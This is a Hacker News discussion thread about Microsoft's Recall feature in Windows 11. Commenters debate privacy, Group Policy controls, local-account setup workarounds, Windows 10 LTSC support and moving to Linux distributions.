etc. etc.) but none are favorable like you say. A big part of why this is the excellent job that MSFT did as a technical force looking to consolidate Windows as the OS standard all those years ago. The efforts taken by them to ensure broad based application support and customer research and support on Windows has contributed to the continued perpetuation of their monopoly. Were they ever the most technically advanced option? No. Is any of their software products absolutely perfect and without deficiencies? Also no. And yet they are possible the leading software company in the world. This is NOT solely due to their anticompetitive practices. Saying so is a form of denial about the true state of things. I gave Canonical and Ubuntu as an example of someone else who has tried to step in the breach and failed to force out MSFT as an alternative for non-experts and non-enthusiasts. Ubuntu and the FOSS community are many things but friendly to beginners and non-technical people is not one of them. There have been tremendous advances in the past decade but we're nowhere close to this being the Year of the Linux Desktop. The bottom line is that mainstream (i.e. non-technical and non-enthusiast) consumers will choose to put their money where they get the best value and that remains MSFT and Windows. reply jorvi 11 hours agorootparentprev> MSFT have spent a lot of time, effort and dev years ensuring that their customers can run their software without breakage and downtime I don’t know about that, but they have spent a lot of hours making sure you can run .exe’s from 30 years back, which is wildly valuable to slow-moving corporations. reply hiatus 27 minutes agorootparent> I don’t know about that, but they have spent a lot of hours making sure you can run .exe’s from 30 years back, which is wildly valuable to slow-moving corporations. Which ones? There are tools like dosbox to get old DOS programs running again. reply nolist_policy 10 hours agorootparentprevWeb browsers are remarkably backwards compatible as well. 20 year old websites continue to work fine. The only difference is that the web platform wasn't very capable 20 years ago. reply arp242 13 hours agorootparentprevWhen the first Asus Eee laptops came out they had Linux installed. They later also did Windows XP versions. This was the first (and probably only) time you could find Linux machines in most mainstream computer stores. The Linux version was better than XP in every way you can measure: cheaper, faster, easier (more optimized for those 7\" screens). And these \"netbooks\" were just intended for browsing the net, so it doesn't matter all that much which system you run. I worked at a computer store at the time, and the Linux machines sold poorly. People wanted Windows, because that's what they're used to. Consumers are very price-sensitive, but many opted to pay more. All of this was a long time ago, but I doubt it would be very different today. Microsoft really doesn't need a \"lobby\" to keep the majority of machines Windows by default. People want what they're used to, because that's what's working for them. why do you think there is so much complaining every time Gnome or Firefox changes something? reply ezst 5 hours agorootparent> People wanted Windows, because that's what they're used to. which is exactly what I'm talking about, that's the force that keeps competition inexistent: there can't be exposure to alternatives if the alternatives are not given equal visibility. Now, let's repeat what Asus did by making it into the law that resellers must offer 3/4 OS alternatives, and let's wait out a few more terrible Windows releases to see if a trend emerges. > People want what they're used to, because that's what's working for them. Understandable, but in practice Microsoft keeps breaking this deal with end-user having no say in the matter (did people overwhelmingly ask for gaming ads and XBox uninstallable links in W7? tiles in W8? Dumbed-down settings in W10? Bullshit AI in W11? …). Now compare this to running a regular upgradeable (or even rolling) linux distro, which one do you think offers the least disruption on the longer run? reply Sol- 13 hours agoprevIs that not consistent with how Microsoft always introduced its \"features\"? Especially all the crap that came since Windows 10/11. First you could still create a local account after there was backlash against cloud-everything, nowadays a local only Windows is quite complex to set up. The Cortana/search bar stuff was also regularly re-enabled or parts of it made non-configurable, with them only occasionally backtracking. Not to speak of the ads that are included nowadays. Their strategy generally seems to be boiling the frog when it comes to pushing these features onto the users, whether they want it or not. reply rafaelgoncalves 12 hours agoparentsame thing with the Edge browser for me, i have to remove on every update (he has so much telemetry that is a burden, same with other parts of the SO). This is a testament on the philosophy change between all those years, i used so much win95/98/xp that i loved, the times were so simple... reply hrnnnnnn 12 hours agoparentprevI set up a local only Windows 11 machine recently. 1. Install with throwaway Microsoft account 2. Create new local admin account 3. Use local admin account to delete setup account Not ideal, but not difficult either. reply ynik 6 hours agorootparentYou can still install Windows 11 without a Microsoft account. It requires configuring the installation before you boot from the USB stick. I use https://rufus.ie/en/ when creating bootable USB sticks, and it turns out that this tool detects when you're trying to create a Windows installation medium, and prompts with a list of useful customizations, including \"Remove requirement for online Microsoft account\". (if you look through the screenshots on the webpage, there's one with the Windows customization dialog box) reply Gazoche 11 hours agorootparentprevUntil the day they remove the option to create a local admin account. Or force you to login into your online account every XX days. reply nolist_policy 10 hours agorootparentprevDoesn't sound like a supported configuration to me. Wouldn't surprise me if it breaks one day. reply stoobs 5 hours agorootparentThat's how enterprise installations of windows work, and has always been a fully supported configuration. It's just that they've been hiding it more and more for consumer installations in successive releases. reply paranoidxprod 7 hours agorootparentprevYou can also do shift+F10 when a windows install is starting up, then type in `OOBE\\BYPASSNRO`. That reboots and allows you to continue without internet and only setting up a local account without needing an online one. Wouldn't be surprised if Microsoft removes this eventually but I do this all the time when setting up new stations for my job. reply ItsBob 6 hours agorootparentI read recently somewhere that this has been removed in the latest (alpha?) build now... their intention is clear: this install belongs to Microsoft, not you! reply 7bit 9 hours agorootparentprevThat is absolutely a supported configuration. Don't make statements you have zero expertise in. reply guidedlight 15 hours agoprevJust like Microsoft told congress that Internet Explorer couldn’t be uninstalled from Windows 98, even though it didn’t come preinstalled with Windows 95. reply beart 14 hours agoprevThese are the system requirements for recall according to https://support.microsoft.com/en-us/windows/retrace-your-ste... System requirements for Recall Your PC needs the following minimum system requirements for Recall: A Copilot+ PC 16 GB RAM 8 logical processors 256 GB storage capacity To enable Recall, you’ll need at least 50 GB of storage space free Saving screenshots automatically pauses once the device has less than 25 GB of storage space So as long as you never buy a processor with a Copilot+ sticker on the box, I guess you don't have to worry about this? reply 0cf8612b2e1e 13 hours agoparentI was thinking you keep around a dedicated temp file you resize as required. reply adgjlsfhk1 13 hours agorootparentdoing this would destroy your file system performance (almost as much as using Windows). SSDs are much faster when not close to full since it let's them do things like use the unfilled capacity as an SLC write cache. reply 0cf8612b2e1e 13 hours agorootparentDo normal users require maximal SSD performance? So long as they can launch Chrome, the super app is going to handle all of their needs. reply adgjlsfhk1 2 hours agorootparentit depends what you mean. Pretty much no one cares about sequential speeds (unless you are copying 10s of gb it doesn't matter). OTOH, the latency of random 4k reads and writes matters a ton. Any time cached data is read/written (e.g. cookies/ UI settings etc), there are going to be a bunch of tiny disk operations will be performed. reply daghamm 12 hours agorootparentprevThis will kill your ssd performance and eventually also kill your ssd since it will interfere with wear-leveling. reply stackghost 15 hours agoprevNational Defense runs almost entirely on Windows workstations, including \"high-side\" or classified networks. I can't imagine the powers that be are too thrilled with this feature, and much like the Intel TPM High Assurance bit, I bet there's an undocumented way to remove it. reply jazzyjackson 15 hours agoparentWhy wouldn't government customers want this feature, they're obsessed with collecting logs of what occurs on managed devices reply XorNot 15 hours agorootparentNot if the data stays device local. Then it's a liability. reply ARandomerDude 15 hours agorootparentGive it time. I suspect step 1 is \"don't worry, it's on your device.\" Step 2 will be \"now it's in the cloud so you don't have to lose your Recall if you lose your computer.\" reply shirro 11 hours agoparentprevThey won't put this shit in enterprise versions of Windows. Those customers will demand their own spyware. Given time it will be twisted into a method for profiling consumers and delivering targeted marketing that goes far beyond cookie tracking and search histories. That doesn't work as effectively on a business or government system. reply 7bit 9 hours agorootparentThey absolutely will. It's all the same. reply 1vuio0pswjnm7 14 hours agoparentprev\"National Defense runs almost entirely on Windows workstations, including \"high-side\" or classified networks.\" Windows is \"military-grade\". That's a laugh. In case of doubt I am referring to the US practice of marketing certain products as \"military-grade\". Perhaps to suggest something like, \"If it is good enough for the military, then it is surely good enough for the civilian.\" reply stackghost 14 hours agorootparent>Windows is \"military-grade\". That's a laugh. On the inside, the term of art for things like Windows is COTS - Commercial, Off-the-shelf. reply myhf 13 hours agorootparentIn some fields, all outside software (including well-known vendors) is called SOUP - software of unknown provenance. reply 1vuio0pswjnm7 10 hours agorootparentprevYeah, the \"military-grade\" products I am comparing to are manufactured according to a specification provided by the customer, not COTS. Bad comparison. reply ben_w 13 hours agorootparentprevWindows for Warships: https://en.wikipedia.org/wiki/Submarine_Command_System reply bongodongobob 15 hours agoparentprevThey've got their own version of Windows and licensing. They're not running Windows 10 Home lol. They've got their own LTSC type thing. DoD works directly with Microsoft. None of this applies to them. reply stackghost 14 hours agorootparentI have worked in National Defense, held a security clearance, etc. and can confidently say you are mistaken. Microsoft is not maintaining a separate build of Windows for DoD. They may have bespoke licensing agreements and support contracts, but military and DoD workstations run regular windows. reply jazzyjackson 13 hours agorootparentThey are, however, maintaining a separate cloud, and parent is not mistaken; windows professional running under group policies is a different animal than windows home https://learn.microsoft.com/en-us/office365/servicedescripti... >> Subscriptions in the GCC High and DoD environments include the core Exchange Online, SharePoint, and Skype for Business features. Given the increased certification and accreditation of the infrastructure, there are some feature differences between the general commercial Office 365 offerings and those available in GCC High and DoD. reply stackghost 12 hours agorootparentI'm not going to get any further into it, but the only one who mentioned \"windows home\" was the other poster, in an attempt at reductio ad absurdum. Whether or not \"windows professional with group policies\" constitutes \"their own version of windows\" as per bongodongobob is left as an exercise to the reader. reply jazzyjackson 12 hours agorootparentThey said version of Windows, you said there's not a separate build Okay, it's the same operating system, but DoD managed devices have a different set of features and capabilities that are allowed to run on that device so I would contend that counts as a different \"version\", if the disagreement is semantic so be it reply martinsnow 2 hours agorootparentThat's not a different version. The only different version that is known is the Chinese edition of windows, every other sku are as they're listed. reply Spivak 15 hours agoparentprevThe article is a bit of rage-bait. You can already disable it via Group Policy and users can turn it off. They're trying to get clicks because they're trying to make it seems like uninstalling it is some meaningful difference. If you don't trust that the settings on your computer work what in gods name are you using windows for. reply giancarlostoro 14 hours agorootparentI don't trust them not to turn it back on (as happens to all sorts of features after a Windows update), and continue to install garbage I don't need or even wanted. I'm happy on POP_OS! and I'm not going back. Been on POP since January 18th of this year. I gave up on Microsoft when I realized Windows Defender will send over files to Microsoft it thinks are suspicious, and there's 0 audit trail for the files. For all I know it could be just about anything personal or even proprietary company files. I had other reasons, but that one set me off as the final straw. The other one was not being able to make offline accounts by default from installation, without using hacks. reply spartanatreyu 13 hours agorootparentI was with you right up until you said you didn't like Windows Defender sending a file to Microsoft. I want my file system to have metadata that (along with things like name, last edited, checksum, etc...) puts all files into one of three buckets: 1. Pre-installed 2. User generated 3. External sources (e.g. Downloaded, transferred from network, transferred from device) If a file from an external source becomes executable then starts affecting my pre-installed/user-generated files and it's checksum isn't already on microsoft's whitelist, then I want microsoft to quarantine that executable and look inside it to figure out what the heck it's doing to my computer. Consider this: No one is uploading your personal files, they don't do anything and trying to look into them wouldn't help anyone avoid viruses. Only executables are worth looking at. Every single executable that was generated from an external source has been checked by microsoft. That is how microsoft, apple, google, and every anti-virus provider out there gets new virus definitions added to their virus lists. If those executables weren't sent, then every single virus definition would be empty. reply giancarlostoro 7 hours agorootparent> If a file from an external source becomes executable then starts affecting my pre-installed/user-generated files and it's checksum isn't already on microsoft's whitelist, then I want microsoft to quarantine that executable and look inside it to figure out what the heck it's doing to my computer. Yes, but I want an audit log of it all. I doubt they'll ever add this, so I'm not going to blindly trust Microsoft. In my case most files are probably not whitelisted anyway. I download some really huge files sometimes, do those get uploaded too? Do they throttle the uploads and if they don't are they just killing my personal network bandwidth? Like there's too many questions that set me off. I'm happy with my choice. reply Dalewyn 13 hours agorootparentprev>I don't trust them not to turn it back on Microsoft respects Group Policy because enterprise uses Group Policy. reply giancarlostoro 7 hours agorootparentThat is fair, I did not know that, I thought this was only respected if you were an enterprise licensed user, but that might be my misunderstanding. Even so, I've gotten so used to Linux, I can't go back. Whenever I use Windows I wind up missing Linux. The only thing holding me on Windows was games, but Steam's Proton has gotten insanely well. reply Dalewyn 6 hours agorootparentGroup Policy is available in any version of Windows from Professional and up and doesn't require joining into a domain or a special license. A standalone Windows Professional install can effect Group Policy for itself and the policies thereof will be respected. Home also technically has Group Policy, but it's not supposed to and most workarounds to that effect are very janky. reply Smar 15 hours agorootparentprevMicrosoft has a history of re-enabling privacy violating settings after a while, so I would be concerned too. reply shakna 14 hours agorootparentprevThe only officially supported way is disabling via Group Policy - but only for Enterprise systems. Whilst users can turn it off today, Microsoft's history and lack of straightforward responses, suggests that won't be the case tomorrow. Besides: Some of the concerns are that it can be utilised by people such as home abusers to track those who might be looking for help to leave that situation. It's a new, very powerful, avenue of control for people stuck there. Being able to opt-out does not fix that. They've created a new way for people to be harmed. reply JohnMakin 14 hours agorootparentprev> If you don't trust that the settings on your computer work what in gods name are you using windows for. gaming and for sandboxes. It became obvious to me a while ago with the slow integration of ads where this was going, and that I could never treat windows as a serious work station, unfortunately. I don’t even do banking on windows machines anymore, and it sucks because I greatly prefer WSL 2 and windows tools for my work environment compared to something you typically see in a corporate setting like a Mac. reply LeonB 15 hours agorootparentprev> If you don't trust that the settings on your computer work what in gods name are you using windows for Most people don’t get any choice at all about what operating system they use. And those that do get a choice have extremely limited options. reply arp242 12 hours agorootparentprevI don't really use Windows, And just have a Windows VM I use for testing or compiling some things. The amount of effort I had to spend to turn off things like Search Indexer and Windows Defender is insane. You can disable things in the control panel but it's still not really disabled and you have to play tricks to really disable it somewhere else. And then sometimes it would come back on because ... reasons? I have zero faith that if I disable something (anything!) on Windows that 1) I've actually disabled it, and 2) that it will stay off. Current Windows is absolutely horrible giving any control over the internals – even more so than the old XP/7 systems were. Before my VM I hadn't touched Windows at all for more than ten years, and I was shocked just how difficult some of these things had become. reply ChicagoDave 15 hours agoprevLiterally no one wants this “feature”. Microsoft has lost their collective minds. reply thefz 8 hours agoparentWe can discuss how this has been implemented all day (and probably agree), but decades in IT have taught me that people use computers differently, especially now that the level of literacy needed to operate one is almost zero. I am good with terminal, browser, NP++ and few other programs, while some people don't even know the existence of a file system hierarchy, or want to touch things to interact with them instead of typing. reply BizarroLand 1 hour agorootparentMr. Thefz, what you've just said is one of the most insanely idiotic things I have ever heard. At no point in your rambling, incoherent response were you even close to anything that could be considered a rational thought. Everyone in this room is now dumber for having listened to it. I award you no points, and may God have mercy on your soul. reply garagemc2 15 hours agoparentprevNo. But people do want large action models and for that you need a training dataset, which is what Recall will provide. reply croes 13 hours agorootparentRemenber this Key & Peele sketch? https://www.youtube.com/watch?v=s0lUbqDrFWU NSFW Will be a lot easier with Recall reply namrog84 15 hours agorootparentprevExactly. People don't want certain things but also want an ai to do other certain things and don't realize the path to 1 is thru the other. reply NavinF 14 hours agorootparentprevThat model would have to be trained locally since the data never leaves the device reply dartharva 14 hours agorootparentSo they say.. reply NavinF 14 hours agorootparentThis is some serious tinfoil hattery. The data is not small. If it was being uploaded, you'd notice. reply ed_mercer 14 hours agorootparentIf screenshots were OCRed and then only text was uploaded, I doubt you would notice anything. reply hnben 6 hours agorootparentprev> This is some serious tinfoil hattery. microsoft regularly makes promises about privacy and telemetry, and regularly breaks them. They have been multiple law suites about this. In germany we say \"Wo ein Trog ist, sammeln sich die Schweine\", especially in the discussion around recall. reply NavinF 2 hours agorootparentHave they lost any of those lawsuits? reply phito 13 hours agorootparentprevPssst... You can extract metadata from data and then train on those \"anonymized\" metadata ;) reply NavinF 14 hours agoparentprevI do. In fact I already record my screen and steam it to my NAS for automatic time tracking and OCR search. It'd be nice to have a less a less janky solution. I'm kinda surprised people just throw away their history. I love being able to restore deleted posts as long as I remember a few words of the content reply phito 13 hours agorootparentTo me it's weird that people need a history at all. It's always been disabled on my browsers and I never felt the need for it. reply jraph 12 hours agorootparentBrowser history makes my browsing incredibly more efficient and is the number one reason why I copy my Firefox profile on new computers. It lets me find back pages I know I browsed in the past with a (few) keyword(s) in the address bar without firing a web search, which might not return the same results as last time. Like, what was the exact crêpe recipe I followed last time? The alternative is bookmarks but then you need to think of bookmarking the page at the time you access it, but you don't always know you will want to go back to a page later. It also makes it very efficient to reach pages I visit frequently. Unfortunately it also makes procrastination very efficient, with slacking off one character away ('n'). reply houseplant 14 hours agorootparentprevin all kindness, you're such an incredibly niche example of actual usage of this, that only proves it should've been opt-in instead of opt-out. I don't need to know what my tabs were 3 months ago. I don't need to treasure my precious history of browsing amazon for vacuum cleaners. reply hnpolicestate 14 hours agorootparentThere are two types of computer users in this world. 1 billion tabs forever and BleachBit obsessives. I get anxiety if I don't restart my devices daily. reply zamadatix 5 hours agorootparentprevI'll agree they are an incredibly niche example of actually using this... but only because ways to do this right now are incredibly niche. The rest remains to be seen. If there hadn't been decades of normality of browsers storing history then people, particularly those in tech circles, would absolutely flip their shit if it were announced as part of Edge. There would be mass revolts on these forums if it would sync with the cloud. It makes measuring how popular a concept would be difficult as what is niche today and what is wildly unpopular with tech folks today may or may not have any relation whatsoever to what will be popular with users in the long term. reply ChicagoDave 3 hours agorootparentI have Malwarebytes installed and block all trackers in Edge and on my iPhone. The idea of recording my activity on my laptop is something I could see being useful in a business where I’m billing non-stop and this feature would automatically generate invoices. But on my personal laptop? I really can’t think of a single legitimate scenario. More importantly, I think Microsoft should be demonstrating what use cases it envisions outside of potentially generating LLM training data. reply SebastianKra 14 hours agorootparentprevIt is ~opt-out~. EDIT: I meant opt-in. reply phito 13 hours agorootparentSurely all the computer illiterate people will disable it and not get spied on then, right, right?? reply FeepingCreature 14 hours agoparentprevI think it's a very cool idea. I wish Linux had this. To be fair I also presently have several hundred tabs open and never delete anything. reply rozab 8 hours agorootparentTo be fair neither Windows nor AI need to have anything to do with it, there's someone in the thread who streams their monitor to a NAS and runs it through OCR reply Dalewyn 13 hours agoparentprev>Literally no one I can see most people, and by that I mean the rest of the world outside Techiestan and Hacker News, will want or perhaps even need this feature. Having the computer literally show you what you were doing is super duper handy for Joe Average who doesn't computer and certainly doesn't care about learning to computer. reply zarzavat 13 hours agorootparentEven Joe Average will appreciate how fucking creepy this feature is when they surface private information that they never told the computer to store. reply langsoul-com 13 hours agoprevCurrently using Ubuntu as my main driver, replaced Windows. I wouldn't really say the user experience is as good as Windows. Apps hang more often, steam freezes and restarts more. Games crash more often. All problems I wouldn't have on windows. Even though Linux has gotten really far, I wouldn't be using it if windows wasn't so shit now. reply treyd 13 hours agoparentTry PopOS or Linux Mint. Canonical has been messing with Ubuntu the last few years trying to push people to use their new snap package distribution system. The hangs and crashes are one issue I had with it that I never experienced elsewhere. reply nj5rq 7 hours agoparentprevUbuntu is supposed to be the most intuitive or friendly distro (very arguable), but it's a shame how bad and bloated it is. I have been using steam in arch-based distros for a very long time and I have had no issues at all running most Windows games (see https://protondb.com). As someone else mentioned, the only real issue might be anti-cheats in competitive games. reply spartanatreyu 12 hours agoparentprevUbuntu's snap packages are terrible, they lag and crash. It's like Ubuntu saw the Windows Store (less features, worse performance, unmoderated and not used by anyone) and said we want that too. Just download the thing from whoever's website and you won't run into problems. You can download steam for linux directly on steam (in a .deb package). reply anvuong 6 hours agorootparentBut then you'll run the risks of your apps randomly breaking after OS upgrades. A simple Linux headers change can mess up apps installed via .deb files reply masfoobar 12 hours agoparentprev> I wouldn't really say the user experience is as good as Windows. Apps hang more often, steam freezes and restarts more... hmm.. while i do not use my linux systems for steam or high-end gaming, I do not share the same user experience as you. To me, my Linux machines.. running web browsers, RDPs, Text Editors, Mail, etc.. are run rock-solid. If anything, is faster loading apps compared to my Windows 10 work machine and Windows 11 home laptop. My Windows 11 home laptop (which upgraded itself over a year or so, now) only exists because of a job... but that is ending end of the year. I cannot wait! First thing I am doing when im done.. uninstalling Windows 11... hello debian! reply t0bia_s 8 hours agoparentprevTry Fedora. Its most polished linux experience for me. Even though I cannot use it as main driver because of Adobe. reply cmcaleer 13 hours agoparentprevWindows very much still has gaming by the short and curlies. Valve have done a ton of work with Proton that makes it considerably better, but if you enjoy anything competitive Windows is mandatory for anti-cheat. Can't say I've shared your experience in terms of programs hanging more often, with the exception of Steam and games. Productivity apps and browsers run perfectly fine for me. That said, Windows has its own frustrations. I'm not sure if it's all fixed yet, but Xbox Game Bar and Game Mode for Windows came with awful performance penalties. When it first came out they had this Game DVR feature which was like Shadowplay but limited your FPS to half of your refresh rate. Enabled by default. reply Nuenki 7 hours agorootparentI find it interesting that I've found Linux to be flawless at gaming, with the exception of VR (though apparently you can make that work as well), but some of my friends have had the complete opposite experience. I think it's strongly determined by the genre of games you like - I don't play esports or gacha games. If anyone here is considering switching to Linux, I'd recommend taking a look at whether the games _you_ play run well. reply akimbostrawman 12 hours agoparentprevthat shouldn't be happening. run the apps from terminal and look what the output is when they crash. reply icelancer 13 hours agoparentprevI switched to Ubuntu on my work machine and had to go back to Windows for most of the same reasons you pointed out. Also, AppImage is so awful. reply OsrsNeedsf2P 13 hours agorootparentWhat's wrong with AppImages? They're basically .exes reply akimbostrawman 12 hours agorootparentanswering your own question. They are nice for portability but bad for security because usually no updates and almost always downloaded from random websites without verification. reply hulitu 13 hours agoparentprev> I wouldn't really say the user experience is as good as Windows I use Windows mainly for work. The user experience is terrible. At least 10 years ago it had a usable GUI, now it is a mess. Crashes are normal. Security theater is _security_. reply leptons 13 hours agorootparent>Security theater is _security_. I've noticed that Windows 11 (on multiple computers) will often display a flash of whatever programs are currently open on my computer before it gives me the login prompt after I wake the computer from sleep. That should never happen. It's yet another nail in the Windows 11 coffin for me. reply varunnrao 12 hours agoprevThis might be a contrarian view to the rest of this thread but I think this is a decisive move by Microsoft. AI-enabled OSes are a part of the future (for mainstream consumers at the very least). By sticking with Recall despite the initial backlash, I think Microsoft is showing they're a serious player. MSFT would not risk their enterprise and government business with features like Recall if they weren't sure that it had a need and requirement at some level. Fundamentally, MSFT isn't a company that preempts the needs of their users and haven't been for the past 25 years. They've lagged behind mobile and then cloud because none of their main customers thought they were important. They face they're going on the front foot is indicative that they have a larger strategic play going on here. Coming to the product itself there appear to be sufficient controls in place on Recall. It's opt-in even if it cannot be uninstalled. It's all on-device and allocates specific space on the PC. I can specify if I don't want it to take snapshots of certain apps and it doesn't take snapshots of private browsing by default. IT teams can manage Recall through policies AND users can have further fine grained control over their settings beyond that. It's great that MSFT have included these right from the start because if we're frank, not all other tech companies would have thought it through. Personally, I wouldn't use Recall but I can see the appeal and usefulness -- for both consumers and IT teams. You ask your computer what you did on so-and-so date and it'll tell you? That's great and what computers should do -- take cognitive load off of our minds. Plus it's a great audit trail in the office. My only gripe with it -- as with anything MSFT really -- is security. I'm not entirely sure MSFT would be able to stop people writing malware that explicitly steal Recall data. I hope they have safeguards but being closed source that's the best we can expect unfortunately. I know HN users are more likely to be anti-MSFT and more tech savvy than the average consumer -- it's a bit like the tech enthusiasts buying smart products and the senior engineer living alone in a forest off-grid. But what we have to remember that we're the exception than the rule. Most people are tech-illiterate and have no inclination towards learning more or towards spending more time with their computers. Products like this are for them. reply dartharva 14 hours agoprevThe Enterprise/IoT LTSC versions of Windows 10 with extended support up to 2032 are available with commercial Visual Studio licenses iirc. If you can't somehow get hold of an ISO from your office's IT admin you can always sail the high seas :) You can evaluate it here: https://info.microsoft.com/ww-landing-windows-10-enterprise.... reply imposterr 13 hours agoparentGetting an unverifiable iso for Windows seems like a bigger security risk than Recall tbh. Does MS publish hashes for the LTSC versions to at least let you ensure what you have hasn't been altered? reply BallyBrain 11 hours agorootparentInternet Archive has a copy https://archive.org/details/en-us_windows_10_iot_enterprise_... Be sure to check the hash with the link provided in comment from dartharva's. Hint, it checks out. reply dartharva 13 hours agorootparentprevYes, yes it does. The MVS portal provides checksums for each download. There are also unofficial MVS dumps like here: https://awuctl.github.io/mvs/ reply Foobar8568 13 hours agorootparentprevThey used to publish them on msdn download page, which was accessible with only an account. reply davidy123 2 hours agoprevI don't understand why it's even legal; it's akin to call recording, which is illegal in many areas. Basically I think it's a great idea for people to AI-process their own information, but when it comes to conversations, it's highly problematic. reply riffraff 13 hours agoprevI'm confident if we all start calling it \"find last week's porn\" instead of \"recall\", it will make things better. reply moi2388 12 hours agoparentNew feature: Search all your porn history, credit card information and passwords from all time, from any pc with windows recall cloud reply imtringued 12 hours agoparentprevThat is literally what it will end up doing. reply dwoldrich 14 hours agoprevI get that control of AI is playing for all the marbles, so I understand the desperate need to gather all the training data. Recall and its reason for being is an insult to my intelligence, and I will not be choosing Microsoft in the future. Windows now has negative value for me. reply jml7c5 14 hours agoparentIsn't Recall on-device only? reply x3n0ph3n3 13 hours agorootparentUntil it isn't. Why believe them? reply DarkmSparks 14 hours agoprevand windows 10 is end of life in a little over a year. I want to believe this is the end of the line for windows, but it feels more like the end of humanity. :( reply croes 13 hours agoprevParents and partners are provided with surveillance tools. Got it. reply surfingdino 13 hours agoparentAs well as government and employers. reply dustypotato 10 hours agoprevWhy would Microsoft push something that no user wants, is a privacy nightmare, a PR disaster, entails additional costs for them in storage, network and compute? It's to train a multimodal AI model on what each employee role is doing and to replace employees. Because a lot of our jobs are looking at one set of windows and typing/clicking on another set. reply haolez 14 hours agoprevThey are probably thinking of training agents to do the back office work of their customers, no? Seems kinda obvious, regardless of the \"this is local data only\" talk. reply yoyohello13 14 hours agoparentI think you’re on to something. There is no way they would be pushing this so hard if they didn’t get something out of it, and collecting mass amounts of training data seems like a plausible explanation. reply 0cf8612b2e1e 13 hours agorootparentHow much more is there left to collect? They already own Outlook, Edge, Bing, One Drive, Sharepoint, GitHub, LinkedIn, etc. Thanks to numerous dark patterns, Microsoft is already getting a ton of telemetry about everything users are doing. You have to fight the OS to not let OneDrive slurp up every byte of data. The only avenue really free from their clutches is mobile, but this does nothing to alleviate that. reply bragh 13 hours agorootparentBut that's the thing: they do not have the data on things and usage patterns that exist outside the Microsoft ecosystem and/or on-premises/private clouds, such as work done within Atlassian stack, ERPs, desktop software and so on. reply rezokun 15 hours agoprevBut why so? Doesn't this mean that Microsoft want (and will) to spy on the contents of your screen anyway even if Recall \"disabled\"? reply laylower 5 hours agoprevWhy is recall needed? What does it even offer - what is the use case for its existence? reply dylan604 5 hours agoparentI assumed for readers of this forum, that answer would be obvious. They want the training data. The fact that it might possibly render a benefit to the user is totally a side effect reply jimjimjim 14 hours agoprevSomebody's bonus is dependent on Recall being there reply userbinator 15 hours agoprevI suspect this will lead to an increase in the number of people staying on Win10 and below. Naturally, MS will also continue spreading their usual FUD in their attempts at persuading the userbase to \"bend over and take it\". This will also lead to an increased demand for custom \"distros\" and modding tools and such, which has always been a bit of an \"underground\" community but has occasional resurgences. https://news.ycombinator.com/item?id=40130230 As the old saying goes: \"challenge accepted.\" ;-) reply fsckboy 15 hours agoparent>people staying on Win10 and below everything below 10 has been EOL for a good while now, and 10 only has a year left reply userbinator 15 hours agorootparentNo one really cares about that \"EOL\" crap unless they've been brainwashed by the FUD. A lot of very important software[1] still works on Vista or 7, and a large portion of that even on XP and below. Also don't forget that Win10 IoT LTSC is officially supported until 2032. [1] Not things like the latest games, but LOB applications and related software that companies rely on for their work. reply hnpolicestate 14 hours agorootparentGamers will care though. I know that demo seems irrelevant but I would assume a non-insignificant % of Windows users use the OS just to game. I hope some developers can recognize the concerns many of us have with Win 11 and continue developing for 10 past EOL. reply sunaookami 13 hours agorootparentWindows 11 recently surpassed 50% on Steam, so yeah. reply StableAlkyne 14 hours agorootparentprevNo longer receiving security updates on an OS who receives most malware and has a history of vulnerabilities isn't FUD reply userbinator 14 hours agorootparentExactly the sort of brainwashing I was referring to. Security depends entirely on your threat model. Look up the CVE stats by OS and you'll see the truth. reply zamadatix 6 hours agorootparentI agree security depends on your threat model but CVEs counts tell you newly noted vulnerabilities and you don't really need to bother with that when the you've already got dozens that'll never be patched. reply StableAlkyne 14 hours agorootparentprev> Look up the CVE stats by OS 2024: https://www.cvedetails.com/top-50-products.php?year=2024 9 of 10 are Windows branded operating systems. 3,276 across all of these platforms. Of these, over 1,000 are different versions of Windows 10. Compared to 1799 on the Linux kernel, which is actively developed and will be actively developed for the foreseeable future. Are you arguing that Windows doesn't continuously get CVE entries? That is not supported by the data. It is not logical to arrive at the conclusion that after the manufacturer states they will no longer address vulnerabilities, which are actively being found as if this year, that this is FUD. reply Dalewyn 13 hours agorootparent>9 of 10 are Windows branded operating systems. 3,276 across all of these platforms. Of these, over 1,000 are different versions of Windows 10. Compared to 1799 on the Linux kernel, which is actively developed and will be actively developed for the foreseeable future. How many of those CVEs actually affect you in a tangible way as to disturb your sleep at night? If you are not considering your threat model to discern which threats you should actually care about, you are doing computer security wrong. reply StableAlkyne 12 hours agorootparentThe OP invoked CVEs for the FUD argument, not me I agree completely that they have a low signal to noise ratio reply userbinator 14 hours agorootparentprevI'm saying that the newer the version, the more CVEs it has. Of these, over 1,000 are different versions of Windows 10 Precisely. Windows 11 will be worse. Of course this doesn't exclude bogus/trivial ones, since CVE-chasing is a thing now, but how many were found in older versions? ...and no surprise that I'm being downvoted by the corporate-authoritarian shills for speaking against the narrative. Yet it should be clear that the newer the code is, the buggier it is --- especially with the sort of competence that passes for developers these days. MS is adding more and more attack surface every day. \"Truth doesn't mind being questioned. A lie does not like being challenged\" ;-) reply StableAlkyne 14 hours agorootparent> Precisely. Windows 11 will be worse. The difference is Win11 continues to address these vulnerabilities. Or you switch to a Nix or air gap the machine. The incorrect approach is to continue using Win10 in production as if nothing is going to happen. I suspect we have gotten sidetracked into arguing different things at each other for this reason reply daveguy 14 hours agorootparentprevIt's not FUD when they stop issuing security patches. I am switching to Linux. reply slowmovintarget 15 hours agoparentprevI went looking for this because I knew I had just come across something like it. Repo is here: https://github.com/ntdevlabs/tiny11builder reply phreack 15 hours agoparentprevYeah, Win10 will be my last Windows once the curtain starts to fall. Win11 has only got more invasive since release. reply weq 14 hours agorootparentWin7 4 lyfe. dozens of less RCE opportunities by the day. reply userbinator 14 hours agorootparentExactly. Known unknowns vs. unknown unknowns. reply x3n0ph3n3 15 hours agoparentprevI can't imagine IT departments are going to put up with this, either. reply wingmanjd 15 hours agorootparentNope, not enjoying this at all. We're already looking at full OS alternatives for our workloads. reply slowmovintarget 15 hours agorootparentLinux + Bottles / Lutris. I wouldn't go to Win 11, and Linux actually is good enough now. reply dylan604 15 hours agorootparent> Linux actually is good enough now. You say this like there is one Linux that people can use. Instead, it is fragmented to hell and back with various distros. Since it's a replacement for Windows, a GUI will be needed. There's more than one of those as well. So now, some one needs to go down that rabbit hole of trying to decide which distro/GUI will work for them. So a generic \"use Linux\" is not very helpful. reply BigJono 15 hours agorootparentI installed Pop OS with about 10 minutes research as soon as this Recall bullshit was announced, and everything I've tried so far works fine. Having more options isn't a bad thing unless you let yourself suffer choice paralysis. You can just not do that. reply 